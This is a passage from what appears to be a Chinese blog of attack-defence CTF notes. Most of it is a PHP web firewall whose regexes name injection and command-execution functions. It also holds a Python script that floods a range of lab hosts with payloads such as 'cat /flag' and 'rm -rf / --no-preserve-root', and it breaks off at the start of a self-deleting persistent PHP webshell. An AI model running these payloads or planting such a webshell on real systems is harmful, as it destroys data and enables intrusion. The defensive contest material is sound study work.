<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-variable">$pattern</span>);<br>    <span class="hljs-variable">$bool</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$vpattern</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$v</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$kk</span> =&gt; <span class="hljs-variable">$vv</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$value</span>/i&quot;</span>, <span class="hljs-variable">$vv</span>)) &#123;<br>                    <span class="hljs-variable">$bool</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-title function_ invoke__">logging</span>(<span class="hljs-variable">$input</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logging</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<br><span class="hljs-variable">$time</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(LOG_FILENAME, <span class="hljs-string">&quot;\r\n\r\n\r\n&quot;</span> . <span class="hljs-variable">$time</span> . <span class="hljs-string">&quot;\r\n&quot;</span> . <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$var</span>, <span class="hljs-literal">true</span>) , FILE_APPEND);<br>&#125;<br><span class="hljs-title function_ invoke__">waf</span>();<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">waf</span></span>&#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$request_url</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$request_method</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$request_data</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$headers</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$raw</span>;<br><br><br><span class="hljs-comment">// 自动部署构造方法</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-comment">//echo &quot;class waf construct execute..&lt;/br&gt;&quot;;   //debug code</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_access_log_probably</span>();  <span class="hljs-comment">//记录访问纪录    类似于日志</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_access_logs_detailed</span>();  <span class="hljs-comment">//纪录详细访问请求包  </span><br><span class="hljs-comment">//echo &quot;class waf construct execute..2&lt;/br&gt;&quot;;</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;GET&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;method&quot;</span>);<br>&#125;<br><span class="hljs-comment">//echo &quot;class waf construct execute..3&lt;/br&gt;&quot;;</span><br><span class="hljs-variable language_">$this</span>-&gt;request_url= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]; <span class="hljs-comment">//获取url来进行检测</span><br><br><br><span class="hljs-variable language_">$this</span>-&gt;request_data = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取post</span><br><br><span class="hljs-variable language_">$this</span>-&gt;headers =<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_all_headers</span>(); <span class="hljs-comment">//获取header  </span><br><br><span class="hljs-comment">//echo &quot;class waf construct execute half..&lt;/br&gt;&quot;;</span><br><br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$this</span>-&gt;request_url)))); <span class="hljs-comment">//对URL进行检测，出现问题则拦截并记录</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$this</span>-&gt;request_data)))); <span class="hljs-comment">//对POST的内容进行检测，出现问题拦截并记录</span><br><span class="hljs-comment">//echo &quot;class waf construct execute..4&lt;/br&gt;&quot;;</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">detect_upload</span>();<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">gloabel_attack_detect</span>();<br><br><br><span class="hljs-comment">//echo &quot;class waf construct execute  success..&lt;/br&gt;&quot;;</span><br><br>&#125;<br><br><span class="hljs-comment">//全局输入检测  基本的url和post检测过了则对所有输入进行简单过滤</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gloabel_attack_detect</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$headers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$value</span>)))); <span class="hljs-comment">//对http请求头进行检测，出现问题拦截并记录</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//简单过滤</span><br>&#125;<br>&#125;<br><br><br><span class="hljs-comment">//拦截所有的文件上传  并记录上传操作  并将上传文件保存至系统tmp文件夹下</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detect_upload</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;size&#x27;</span>]&gt;<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;小伙子你不讲武德啊，你这上传的是啥?????你很危险啊！(╯‵□′)╯︵┻━┻&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;Upload&quot;</span>);<br><span class="hljs-comment">//move_uploaded_file($_FILES[$key][&quot;tmp_name&quot;],&#x27;/tmp/uoloadfiles/&#x27;.$_FILES[$key][&quot;name&quot;]);</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//记录每次大概访问记录，类似日志，以便在详细记录中查找</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_access_log_probably</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-variable">$raw</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&#x27;    &#x27;</span>; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="hljs-string">&#x27;     &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&#x27;     &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>].<span class="hljs-string">&#x27;    &#x27;</span>; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-string">&#x27;POST: &#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>).<span class="hljs-string">&quot;\r\n&quot;</span>; <br><span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;all_requests.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//日志路径 </span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$raw</span>);  <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>&#125;<br><br><span class="hljs-comment">//记录详细的访问头记录，包括GET POST http头   以获取通防waf未检测到的攻击payload</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_access_logs_detailed</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&quot; -- &quot;</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_http_raws</span>().<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br>    <span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;all_requests_detail.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//日志路径 </span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$data</span>));  <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">获取http请求头并写入数组</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_all_headers</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(); <br> <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123; <br>            <span class="hljs-variable">$headers</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>; <br>        &#125; <br>    &#125; <br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>; <br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_invisible</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$ascii</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ascii</span>&gt;<span class="hljs-number">126</span> || <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">32</span>)&#123; <span class="hljs-comment">//有中文这里要修改</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>)))&#123;<br>                <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;interrupt&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>), <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_0x25</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&quot;%25&quot;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;%25&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>    &#125;<br>&#125; <br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\b</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_attack_keyword</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/select\b|insert\b|update\b|drop\b|and\b|delete\b|dumpfile\b|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|multipoint\(/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;sqli&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//文件包含的检测</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &lt; <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\.\.|.*\.php[35]&#123;0,1&#125;/i&quot;</span>, <span class="hljs-variable">$tmp</span>))&#123; <br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base64_decode|eval\(|assert\(|file_put_contents|fwrite|curl|system|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restorei/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;EXEC&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;GETFLAG&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">简单将易出现问题的字符替换成中文</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">获取http的请求包，意义在于获取别人的攻击payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_http_raws</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br><br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>; <br>     <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123; <br>            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">5</span>); <br>            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$key</span>); <br>            <span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;\r\n&quot;</span>; <br>        &#125; <br>    &#125; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$raw</span>; <br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这里拦截并记录攻击payload      第一个参数为记录类型   第二个参数是日志内容   使用时直接调用函数</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_attack_log</span>(<span class="hljs-params"><span class="hljs-variable">$alert</span></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&quot; -- [&quot;</span>.<span class="hljs-variable">$alert</span>.<span class="hljs-string">&quot;]&quot;</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_http_raws</span>().<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br>    <span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;attack_detected_log.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//日志路径 </span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$data</span>);  <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$alert</span> == <span class="hljs-string">&#x27;GETFLAG&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;f1989134-db6e-4769-ac1b-9d6ebf9ef46d&#125;&quot;</span>; <span class="hljs-comment">//如果请求带有flag关键字，显示假的flag。（2333333）</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">//拦截前延时3秒</span><br>    &#125;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><br>&#125;<br><span class="hljs-variable">$waf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">waf</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">反waf<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_attack</span>():<br>    file=&#123;<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;admin.php&#x27;</span>,<span class="hljs-string">&#x27;web.php&#x27;</span>,<span class="hljs-string">&#x27;login.php&#x27;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>,<span class="hljs-string">&#x27;footer.php&#x27;</span>,<span class="hljs-string">&#x27;.a.php&#x27;</span>&#125;<br>    payload=&#123;<span class="hljs-string">&#x27;getflag&#x27;</span>,<span class="hljs-string">&#x27;cat /flag&#x27;</span>,<span class="hljs-string">&#x27;ls -al&#x27;</span>,<span class="hljs-string">&#x27;rm -f&#x27;</span>,<span class="hljs-string">&#x27;echo 1&#x27;</span>,<span class="hljs-string">&#x27;echo 1 /proc/sys/net/ipv4/ip_forward&#x27;</span>,<span class="hljs-string">&#x27;rm -rf / --no-preserve-root&#x27;</span>&#125;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">52</span>):<br>            <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> file:<br>                url=<span class="hljs-string">&#x27;http://192.168.63.&#x27;</span>+ <span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;:8801/&#x27;</span>+ii<br>                <span class="hljs-built_in">print</span>(url)<br>                <span class="hljs-keyword">for</span> iii <span class="hljs-keyword">in</span> payload:<br>                    data=&#123;<br>                        <span class="hljs-string">&#x27;payload&#x27;</span>:iii<br>                    &#125;<br>                    <span class="hljs-keyword">try</span>:<br>                        requests.post(url,data=data)<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在搅屎:&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;|&#x27;</span>+ii+<span class="hljs-string">&#x27;|&#x27;</span>+iii)<br>                        time.sleep(<span class="hljs-number">0.1</span>)<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        time.sleep(<span class="hljs-number">0.1</span>)<br>                        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scan_attack()<br><br></code></pre></td></tr></table></figure><p>3.后门扫描：d盾，seay</p><p>4.不死马和反不死马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">生成不死马<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//设置与客户机断开是否会终止脚本的执行，true则不会</span><br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">//如果为零说明永久执行直到程序结束</span><br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);  <span 